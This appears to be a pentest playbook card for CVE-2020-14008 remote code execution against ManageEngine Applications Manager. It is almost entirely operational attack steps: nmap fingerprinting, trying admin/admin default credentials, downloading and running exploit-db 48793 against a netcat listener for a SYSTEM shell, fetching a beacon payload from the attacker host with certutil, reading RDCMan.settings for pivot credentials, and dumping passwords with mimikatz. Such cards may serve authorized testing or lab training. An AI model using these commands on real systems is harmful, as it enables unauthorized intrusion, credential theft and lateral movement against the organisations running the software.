title: ManageEngine AppManager — CVE-2020-14008 RCE
body:
ManageEngine Applications Manager runs on non-standard ports (8443 HTTPS / 44444 HTTP). The login page reveals the version — look for AppManager 14.x (build ≤ 14530) which is vulnerable to CVE-2020-14008, an unauthenticated/authenticated RCE via a malicious JAR file upload through the WebLogic credential test endpoint.

Default credentials are admin/admin — try these before anything else. The nmap AppManager fingerprint and the JSESSIONID_APM_44444 cookie in responses are the giveaway.

The shell lands as NT AUTHORITY\SYSTEM immediately — no privesc needed on the initial box.

Note: The exploit creates a JAR, uploads it, uses a scheduled task to move it to the WebLogic classpath, then triggers RCE via the credentialtest endpoint. The exploit handles all of this automatically — just provide your listener details.

If exploit 48793 fails on direct upload, it automatically falls back to the task-based move method. Wait for it — it takes 30-60 seconds.
cmd:
# ══════════════════════════════════════════════════
# IDENTIFY — AppManager on non-standard ports
# ══════════════════════════════════════════════════
nmap -sV -p 8443,44444 <target>
# Look for: AppManager, JSESSIONID_APM_44444, Applications Manager in title
# feroxbuster will hit /backup /bin /mobile on the root

# ══════════════════════════════════════════════════
# DEFAULT CREDS — always try first
# ══════════════════════════════════════════════════
# Browse to http://<target>:44444 or https://<target>:8443
# Username: admin
# Password: admin
# Version shown in bottom-left of dashboard

# ══════════════════════════════════════════════════
# EXPLOIT — CVE-2020-14008 (AppManager 14.x ≤ 14530)
# ══════════════════════════════════════════════════
# Download:
wget https://www.exploit-db.com/download/48793 -O 48793.py
pip3 install requests urllib3 --break-system-packages
# OR use venv:
python3 -m venv venv && source venv/bin/activate && pip install requests urllib3

# Set up listener first:
nc -nlvp <port>

# Run exploit:
python3 48793.py http://<target>:44444 admin admin <kali-ip> <port>
# https variant:
python3 48793.py https://<target>:8443 admin admin <kali-ip> <port>

# ══════════════════════════════════════════════════
# WHAT HAPPENS
# ══════════════════════════════════════════════════
# [*] Visiting page to retrieve initial cookies...
# [*] Retrieving admin cookie...
# [*] Getting base directory of ManageEngine...
# [*] Found base directory: C:\Program Files\ManageEngine\AppManager14
# [*] Creating JAR file...
# [*] Uploading JAR file...
# [!] Failed to upload JAR directly, continue to add and execute job to move JAR...
# [*] Creating a task to move the JAR...
# [*] Executing task... (this takes 30-60 seconds)
# [*] Running the Weblogic credentialtest which triggers code in JAR...
# [*] Check your shell...
# Shell lands as: NT AUTHORITY\SYSTEM

# ══════════════════════════════════════════════════
# POST-SHELL — immediate actions
# ══════════════════════════════════════════════════
# Upgrade to stable shell (C2 beacon recommended):
certutil -urlcache -split -f http://<kali-ip>:<port>/beacon.exe C:\Tmp\beacon.exe
C:\Tmp\beacon.exe

# Find RDCMan settings (pivot creds):
dir /s /b C:\*.settings 2>nul
# Usually: C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
type "C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings"

# Also check for the older .rdg format:
dir /s /b C:\*.rdg 2>nul

# Pull credentials from Credential Manager (run mimikatz):
# privilege::debug
# sekurlsa::logonpasswords
# Look for credman blocks with cleartext passwords
warn: The exploit requires Java (jar command) to be available on Kali to build the malicious JAR. If 'jar' is not found, install default-jdk: sudo apt install default-jdk. The exploit also requires requests and urllib3 — Kali's externally-managed pip will block system install; use --break-system-packages or a venv. The 'Failed to upload JAR directly' message is NORMAL — the exploit continues via the scheduled task fallback automatically. Do not kill it.

choices.label: Got shell — find pivot creds (RDCMan / mimikatz)
Got creds from RDCMan settings — lateral move
